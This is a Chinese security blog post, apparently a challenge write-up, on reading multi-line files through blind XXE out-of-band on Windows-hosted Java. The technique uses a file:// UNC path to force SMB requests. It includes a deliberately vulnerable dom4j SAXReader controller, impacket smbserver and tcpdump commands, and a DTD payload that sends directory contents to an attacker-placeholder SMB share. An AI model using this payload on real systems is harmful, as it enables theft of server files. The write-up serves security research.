---
title: No-FTP:高版本JDK如何通过XXE-OOB读取多行文件
url: https://y4tacker.github.io/2025/11/10/year/2025/11/No-FTP-%E9%AB%98%E7%89%88%E6%9C%ACJDK%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87XXE-OOB%E8%AF%BB%E5%8F%96%E5%A4%9A%E8%A1%8C%E6%96%87%E4%BB%B6/
source: Y4tacker:Hacking The World!
date: 2025-11-10
fetch_date: 2025-11-11T03:12:49.643183
---

# No-FTP:高版本JDK如何通过XXE-OOB读取多行文件

* [Home](/)
* [Writing](/archives/)
* [Topics](/tags/)
* [Search](/search/)
* [About](/about/)
* [Friends](/link/)

Previous post Next post Back to top Share post

1. [1. No-FTP:高版本JDK如何通过XXE-OOB读取多行文件](#No-FTP-%E9%AB%98%E7%89%88%E6%9C%ACJDK%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87XXE-OOB%E8%AF%BB%E5%8F%96%E5%A4%9A%E8%A1%8C%E6%96%87%E4%BB%B6)
   1. [1.1. 写在前面](#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2)
   2. [1.2. 环境分析](#%E7%8E%AF%E5%A2%83%E5%88%86%E6%9E%90)
   3. [1.3. 破局思路](#%E7%A0%B4%E5%B1%80%E6%80%9D%E8%B7%AF)

# No-FTP:高版本JDK如何通过XXE-OOB读取多行文件

Y4tacker

2025-11-10 (Updated: 2025-11-10)

[Java](/categories/Java/)

[Java](/tags/Java/)

# No-FTP:高版本JDK如何通过XXE-OOB读取多行文件

## 写在前面

在XXE（XML External Entity Injection）的实际利用中，当遇到没有回显的场景时，通常需要通过OOB（Out-of-Band）方式将数据带出。
传统的XXE-OOB利用中，如果目标文件包含换行符，直接通过HTTP协议外带会因为HTTP请求格式的限制(sun.net.[www.protocol.http.HttpURLConnection#checkURL)导致解析失败，早期常用的解决方案是搭建恶意FTP服务器，利用FTP协议对数据格式限制较少的特点，完整接收多行文件内容，但在后面高版本的修复中通过ftp](http://www.protocol.http.httpurlconnection/#checkURL)%E5%AF%BC%E8%87%B4%E8%A7%A3%E6%9E%90%E5%A4%B1%E8%B4%A5%EF%BC%8C%E6%97%A9%E6%9C%9F%E5%B8%B8%E7%94%A8%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%E6%98%AF%E6%90%AD%E5%BB%BA%E6%81%B6%E6%84%8FFTP%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%8C%E5%88%A9%E7%94%A8FTP%E5%8D%8F%E8%AE%AE%E5%AF%B9%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F%E9%99%90%E5%88%B6%E8%BE%83%E5%B0%91%E7%9A%84%E7%89%B9%E7%82%B9%EF%BC%8C%E5%AE%8C%E6%95%B4%E6%8E%A5%E6%94%B6%E5%A4%9A%E8%A1%8C%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%EF%BC%8C%E4%BD%86%E5%9C%A8%E5%90%8E%E9%9D%A2%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84%E4%BF%AE%E5%A4%8D%E4%B8%AD%E9%80%9A%E8%BF%87ftp) 外带多行数据也被修复了，而机缘巧合下看到朋友发起了一个 XXE 挑战，因而才有了后续的研究

## 环境分析

Killer的原始小挑战：<https://mp.weixin.qq.com/s/Hdd1LeWtzqnc2CGIhPIXBA>

简单写写没有很高深的东西

代码非常简单，我们对其做一个简单梳理：

* 存在 XXE 漏洞
* XML 解析为异步操作(排除了利用时间差)
* try-catch+无报错输出(排除了利用报错实现内容外带)

题目环境:

* JDK:8U202(可以通过请求信息判断)
* OS: WIndows(可以通过请求判断猜测不做展开)

通过以上的简单梳理我们知道了，我们需要达成的条件其实是要在 Windows 下通过远程外带读取文件

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 ``` | ``` package com.example.xxe.controller;  import org.dom4j.Document; import org.dom4j.DocumentException; import org.dom4j.Element; import org.dom4j.io.SAXReader; import org.springframework.http.ResponseEntity; import org.springframework.web.bind.annotation.*; import javax.servlet.http.HttpServletRequest; import java.io.StringReader; import java.util.HashMap; import java.util.List; import java.util.Map; import java.util.concurrent.CompletableFuture;   @RestController @RequestMapping("/api/system") public class BlindXxeController {      @PostMapping("/update-config")     public ResponseEntity<Map<String, Object>> updateSystemConfig(             @RequestParam("configXml") String configXml,             HttpServletRequest request) {                  Map<String, Object> response = new HashMap<>();                  try {             CompletableFuture.runAsync(() -> {                 try {                     SAXReader reader = new SAXReader();                     Document document = reader.read(new StringReader(configXml));                     processConfigDocument(document);                                      } catch (DocumentException e) {                     System.err.println("配置处理错误: " + e.getMessage());                 }             });             response.put("status", "success");             response.put("message", "配置更新请求已提交，正在后台处理");                          return ResponseEntity.ok(response);                      } catch (Exception e) {             response.put("status", "error");             response.put("message", "配置更新请求失败");             response.put("error", "系统内部错误");                           return ResponseEntity.internalServerError().body(response);         }     }       private void processConfigDocument(Document document) {         try {             Element root = document.getRootElement();             List<Element> settings = root.elements("setting");             for (Element setting : settings) {                 String name = setting.attributeValue("name");                 String value = setting.getTextTrim();                 System.out.println("更新配置: " + name + " = " + value);             }                          System.out.println("配置处理完成，共处理 " + settings.size() + " 个配置项");                      } catch (Exception e) {             System.err.println("配置处理异常: " + e.getMessage());         }     }  } ``` |

## 破局思路

其实如何完成这个挑战非常简单，回顾历史 JDK 修复从来都只是修复协议中出现的换行字符
我们也可以得到一个共识：协议只是数据的载体
首先我们需要知道的是 Java 有哪些协议呢，这个答案比较好找，找sun.net.[www.protocol.下的](http://www.protocol.下的/) package 名即可知道
我这里本地环境是 jdk17，所以当前环境下存在 file/ftp/http(s)/jar/jmod/jrt/mailto 这几个协议，从字面猜测可能存在对外请求的有 ftp/http(s)/mailto

![80EC0A62-FF0A-40B2-8205-602E54CD6EB4-70797-000022E778EBD57B](/2025/11/10/year/2025/11/No-FTP-%E9%AB%98%E7%89%88%E6%9C%ACJDK%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87XXE-OOB%E8%AF%BB%E5%8F%96%E5%A4%9A%E8%A1%8C%E6%96%87%E4%BB%B6/80EC0A62-FF0A-40B2-8205-602E54CD6EB4-70797-000022E778EBD57B.PNG)

首先可以排除的就是 http(s) 以及 ftp，而 mailto 呢好巧不巧它实际上只是一个“启动器”协议，本身在 java 中并不能实现信息外带，本身没有实现 getInputStream

![C83A1CFB-B8A0-43A8-AE24-69B38007D598-70797-000022E7876948A0](/2025/11/10/year/2025/11/No-FTP-%E9%AB%98%E7%89%88%E6%9C%ACJDK%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87XXE-OOB%E8%AF%BB%E5%8F%96%E5%A4%9A%E8%A1%8C%E6%96%87%E4%BB%B6/C83A1CFB-B8A0-43A8-AE24-69B38007D598-70797-000022E7876948A0.PNG)

看起来表面上来看这些协议都不能用于请求外带了，那这时候真的就完全没办法了么？
显然并不是，我们一开始在环境解析过程中已知当前 Java 是在 Windows 系统下的，那么我们完全可以通过 file :走 UNC 触发 SMB 协议交互
经过测试 file 协议下确实并没有对换行做限制，报错只是因为带换行符的文件并不存在

![A863CD81-B7DE-44F3-9AA7-1EC82C75F724-70797-000022E794541915](/2025/11/10/year/2025/11/No-FTP-%E9%AB%98%E7%89%88%E6%9C%ACJDK%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87XXE-OOB%E8%AF%BB%E5%8F%96%E5%A4%9A%E8%A1%8C%E6%96%87%E4%BB%B6/A863CD81-B7DE-44F3-9AA7-1EC82C75F724-70797-000022E794541915.PNG)

在 linux 上启动 SMB，需要注意impacket不会把解析失败的原始数据打印出来

|  |  |
| --- | --- |
| ``` 1 ``` | ``` sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share /tmp -smb2support -debug ``` |

所以还需要通过 tcpdump 获取完整协议交互流量

|  |  |
| --- | --- |
| ``` 1 ``` | ``` sudo tcpdump -i eth0 port 445 -A -s 0 ``` |

构造 DTD，因为 java 的 file 自带列目录功能，我们首先需要读取 flag 的位置

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` <!ENTITY % file SYSTEM "file:///C:/"> <!ENTITY % all "<!ENTITY send SYSTEM 'file://ip/share/%file;'>"> ``` |

![4E576878-1338-40D4-9A81-6C33D7233F5B-70797-000022E79E7439B1](/2025/11/10/year/2025/11/No-FTP-%E9%AB%98%E7%89%88%E6%9C%ACJDK%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87XXE-OOB%E8%AF%BB%E5%8F%96%E5%A4%9A%E8%A1%8C%E6%96%87%E4%BB%B6/4E576878-1338-40D4-9A81-6C33D7233F5B-70797-000022E79E7439B1.PNG)

这时候我们便可以看到 flag 文件名接下来读取 flag 就不难了

Please enable JavaScript to view the comments.

* [Home](/)
* [Writing](/archives/)
* [Topics](/tags/)
* [Search](/search/)
* [About](/about/)
* [Friends](/link/)

1. [1. No-FTP:高版本JDK如何通过XXE-OOB读取多行文件](#No-FTP-%E9%AB%98%E7%89%88%E6%9C%ACJDK%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87XXE-OOB%E8%AF%BB%E5%8F%96%E5%A4%9A%E8%A1%8C%E6%96%87%E4%BB%B6)
   1. [1.1. 写在前面](#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2)
   2. [1.2. 环境分析](#%E7%8E%AF%E5%A2%83%E5%88%86%E6%9E%90)
   3. [1.3. 破局思路](#%E7%A0%B4%E5%B1%80%E6%80%9D%E8%B7%AF)

Menu TOC Share Top

Copyright © 2016-2025 Y4tacker

* [Home](/)
* [Writing](/archives/)
* [Topics](/tags/)
* [Search](/search/)
* [About](/about/)
* [Friends](/link/)

本站总访问量次 | 本站访客数人